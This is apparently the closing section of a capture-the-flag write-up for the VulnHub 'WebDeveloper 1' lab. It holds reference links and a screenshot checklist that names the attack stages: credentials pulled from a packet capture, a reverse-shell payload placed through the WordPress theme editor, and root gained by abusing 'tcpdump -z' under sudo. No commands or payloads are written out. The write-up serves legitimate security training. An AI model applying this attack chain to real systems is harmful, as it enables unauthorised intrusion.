- Alexandre Economy — WebDeveloper 1 writeup: https://alexandereconomy.com/writeups/vulnhub/webdeveloper1/
- GTFOBins — `tcpdump`: https://gtfobins.github.io/gtfobins/tcpdump/
- WPScan documentation: https://github.com/wpscanteam/wpscan
- OWASP — WordPress security: https://owasp.org/www-project-web-security-testing-guide/

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — target host discovered on the subnet
- [ ] `images/02-nmap.png` — port/service scan (80, 22)
- [ ] `images/03-enum.png` — directory/file enumeration (`.cap`, `/ipdata/`)
- [ ] `images/03b-wireshark.png` — credentials recovered from the capture
- [ ] `images/04-foothold.png` — theme editor / reverse-shell payload
- [ ] `images/05-shell.png` — `www-data` shell and SSH login
- [ ] `images/06-user-flag.png` — user flag
- [ ] `images/07-privesc.png` — `sudo -l` and the `tcpdump -z` abuse
- [ ] `images/08-root-flag.png` — root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
